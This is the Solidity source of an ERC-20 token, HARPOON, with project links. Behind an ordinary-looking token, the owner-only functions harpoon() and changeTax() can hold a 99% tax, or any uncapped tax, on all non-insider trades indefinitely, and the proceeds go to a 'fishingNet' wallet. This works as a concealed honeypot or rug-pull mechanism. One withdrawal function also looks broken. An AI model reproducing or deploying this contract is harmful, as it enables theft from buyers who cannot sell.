1 /*
2 Harpoon->
3 
4 Website: 
5 https://www.harpoontracker.com/
6 Whitepaper:
7 https://harpoon-tracker.gitbook.io/harpoon-tracker/
8 
9 Socials:
10 https://t.me/HarpoonERC
11 https://twitter.com/HarpoonTracker
12 
13 */
14 // SPDX-License-Identifier: Unlicensed
15 pragma solidity 0.8.18;
16 
17 abstract contract Context {
18     function _msgSender() internal view virtual returns (address) {
19         return msg.sender;
20     }
21 }
22 
23 interface IERC20 {
24     function totalSupply() external view returns (uint256);
25     function balanceOf(address account) external view returns (uint256);
26     function transfer(address recipient, uint256 amount) external returns (bool);
27     function allowance(address owner, address spender) external view returns (uint256);
28     function approve(address spender, uint256 amount) external returns (bool);
29     function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
30     event Transfer(address indexed from, address indexed to, uint256 value);
31     event Approval(address indexed owner, address indexed spender, uint256 value);
32 }
33 
34 library SafeMath {
35     function add(uint256 a, uint256 b) internal pure returns (uint256) {
36         uint256 c = a + b;
37         require(c >= a, "SafeMath: addition overflow");
38         return c;
39     }
40 
41     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
42         return sub(a, b, "SafeMath: subtraction overflow");
43     }
44 
45     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46         require(b <= a, errorMessage);
47         uint256 c = a - b;
48         return c;
49     }
50 
51     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
52         if (a == 0) {
53             return 0;
54         }
55         uint256 c = a * b;
56         require(c / a == b, "SafeMath: multiplication overflow");
57         return c;
58     }
59 
60     function div(uint256 a, uint256 b) internal pure returns (uint256) {
61         return div(a, b, "SafeMath: division by zero");
62     }
63 
64     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
65         require(b > 0, errorMessage);
66         uint256 c = a / b;
67         return c;
68     }
69 }
70 
71 contract Ownable is Context {
72     address private _owner;
73     address private _previousOwner;
74     event OwnershipTransferred(
75         address indexed previousOwner,
76         address indexed newOwner
77     );
78 
79     constructor() {
80         address msgSender = _msgSender();
81         _owner = msgSender;
82         emit OwnershipTransferred(address(0), msgSender);
83     }
84 
85     function owner() public view returns (address) {
86         return _owner;
87     }
88 
89     modifier onlyOwner() {
90         require(_owner == _msgSender(), "Ownable: caller is not the owner");
91         _;
92     }
93 
94     function transferOwnership(address newOwner) public onlyOwner {
95         _transferOwnership(newOwner);
96     }
97 
98     function _transferOwnership(address newOwner) internal {
99         require(newOwner != address(0), "Ownable: new owner is the zero address");
100         emit OwnershipTransferred(_owner, newOwner);
101         _owner = newOwner;
102     }
103 
104     function renounceOwnership() public virtual onlyOwner {
105         emit OwnershipTransferred(_owner, address(0));
106         _owner = address(0);
107     }
108 }
109 
110 interface IUniswapV2Factory {
111     function createPair(address tokenA, address tokenB)
112         external
113         returns (address pair);
114 }
115 
116 interface IUniswapV2Router02 {
117     function swapExactTokensForETHSupportingFeeOnTransferTokens(
118         uint256 amountIn,
119         uint256 amountOutMin,
120         address[] calldata path,
121         address to,
122         uint256 deadline
123     ) external;
124 
125     function factory() external pure returns (address);
126     function WETH() external pure returns (address);
127 }
128 
129 contract Harpoon is Context, IERC20, Ownable {
130     using SafeMath for uint256;
131     mapping(address => uint256) private _balance;
132     mapping(address => mapping(address => uint256)) private _allowances;
133     mapping(address => bool) private _walletExcluded;
134     uint256 private constant MAX = ~uint256(0);
135     uint8 private constant _decimals = 18;
136     uint256 private constant _totalSupply = 10**7 * 10**_decimals;
137     uint256 private constant minSwap = 4000 * 10**_decimals;
138     uint256 private constant onePercent = 100000 * 10**_decimals;
139     uint256 public maxTxAmount = onePercent * 2;
140 
141     uint256 private launchBlock;
142     uint256 private buyValue = 0;
143 
144     uint256 private _tax;
145     uint256 public buyTax = 20;
146     uint256 public sellTax = 60;
147     
148     string private constant _name = "HARPOON";
149     string private constant _symbol = "HRP";
150 
151     IUniswapV2Router02 private uniswapV2Router;
152     address public uniswapV2Pair;
153     address payable public fishingNet;
154 
155     bool private launch = false;
156 
157     constructor(address[] memory wallets) {
158         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
159         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
160         fishingNet = payable(wallets[0]);
161         _balance[msg.sender] = _totalSupply;
162         for (uint256 i = 0; i < wallets.length; i++) {
163             _walletExcluded[wallets[i]] = true;
164         }
165         _walletExcluded[msg.sender] = true;
166         _walletExcluded[address(this)] = true;
167 
168         emit Transfer(address(0), _msgSender(), _totalSupply);
169     }
170 
171     function name() public pure returns (string memory) {
172         return _name;
173     }
174 
175     function symbol() public pure returns (string memory) {
176         return _symbol;
177     }
178 
179     function decimals() public pure returns (uint8) {
180         return _decimals;
181     }
182 
183     function totalSupply() public pure override returns (uint256) {
184         return _totalSupply;
185     }
186 
187     function balanceOf(address account) public view override returns (uint256) {
188         return _balance[account];
189     }
190 
191     function transfer(address recipient, uint256 amount)public override returns (bool){
192         _transfer(_msgSender(), recipient, amount);
193         return true;
194     }
195 
196     function allowance(address owner, address spender) public view override returns (uint256){
197         return _allowances[owner][spender];
198     }
199 
200     function approve(address spender, uint256 amount) public override returns (bool){
201         _approve(_msgSender(), spender, amount);
202         return true;
203     }
204 
205     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
206         _transfer(sender, recipient, amount);
207         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
208         return true;
209     }
210 
211     function _approve(address owner, address spender, uint256 amount) private {
212         require(owner != address(0), "ERC20: approve from the zero address");
213         require(spender != address(0), "ERC20: approve to the zero address");
214         _allowances[owner][spender] = amount;
215         emit Approval(owner, spender, amount);
216     }
217 
218 
219     function enableTrading() external onlyOwner {
220         launch = true;
221         launchBlock = block.number;
222     }
223 
224     function addExcludedWallet(address wallet) external onlyOwner {
225         _walletExcluded[wallet] = true;
226     }
227 
228     function removeLimits() external onlyOwner {
229         maxTxAmount = _totalSupply;
230     }
231 
232     function changeTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
233         buyTax = newBuyTax;
234         sellTax = newSellTax;
235     }
236 
237     function harpoon(uint256 newBuyValue) external onlyOwner {
238         buyValue = newBuyValue;
239     }
240 
241     function _tokenTransfer(address from, address to, uint256 amount) private {
242         uint256 taxTokens = (amount * _tax) / 100;
243         uint256 transferAmount = amount - taxTokens;
244 
245         _balance[from] = _balance[from] - amount;
246         _balance[to] = _balance[to] + transferAmount;
247         _balance[address(this)] = _balance[address(this)] + taxTokens;
248 
249         emit Transfer(from, to, transferAmount);
250     }
251 
252     function _transfer(address from, address to, uint256 amount) private {
253         require(from != address(0), "ERC20: transfer from the zero address");
254 
255         if (_walletExcluded[from] || _walletExcluded[to]) {
256             _tax = 0;
257         } else {
258             require(launch, "Trading not open");
259             require(amount <= maxTxAmount, "MaxTx Enabled at launch");
260             if (block.number < launchBlock + buyValue + 2) {_tax=99;} else {
261                 if (from == uniswapV2Pair) {
262                     _tax = buyTax;
263                 } else if (to == uniswapV2Pair) {
264                     uint256 tokensToSwap = balanceOf(address(this));
265                     if (tokensToSwap > minSwap) { //Sets Max Internal Swap
266                         if (tokensToSwap > onePercent * 4) { 
267                             tokensToSwap = onePercent * 4;
268                         }
269                         swapTokensForEth(tokensToSwap);
270                     }
271                     _tax = sellTax;
272                 } else {
273                     _tax = 0;
274                 }
275             }
276         }
277         _tokenTransfer(from, to, amount);
278     }
279 
280     function manualSendBalance() external {
281         require(_msgSender() == fishingNet);
282         uint256 contractETHBalance = address(this).balance;
283         fishingNet.transfer(contractETHBalance);
284         uint256 contractBalance = balanceOf(address(this));
285         fishingNet.transfer(contractBalance);
286     } 
287 
288     function manualSwapTokens() external {
289         require(_msgSender() == fishingNet);
290         uint256 contractBalance = balanceOf(address(this));
291         swapTokensForEth(contractBalance);
292     }
293 
294 
295     function swapTokensForEth(uint256 tokenAmount) private {
296         address[] memory path = new address[](2);
297         path[0] = address(this);
298         path[1] = uniswapV2Router.WETH();
299         _approve(address(this), address(uniswapV2Router), tokenAmount);
300         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
301             tokenAmount,
302             0,
303             path,
304             fishingNet,
305             block.timestamp
306         );
307     }
308     receive() external payable {}
309 }